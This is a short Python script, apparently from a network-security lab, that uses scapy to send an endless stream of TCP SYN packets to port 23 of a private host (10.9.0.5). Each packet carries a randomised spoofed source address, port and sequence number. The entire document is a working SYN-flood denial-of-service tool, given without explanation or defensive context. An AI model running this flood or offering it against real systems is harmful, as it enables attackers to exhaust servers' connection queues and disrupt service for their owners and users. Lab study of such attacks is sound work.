#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

ip  = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp

while True:
    pkt[IP].src   = str(IPv4Address(getrandbits(32))) # source ip
    pkt[IP].sport = getrandbits(16)     # source port
    pkt[IP].seq   = getrandbits(32)     # sequence number 
    send(pkt, verbose = 0)
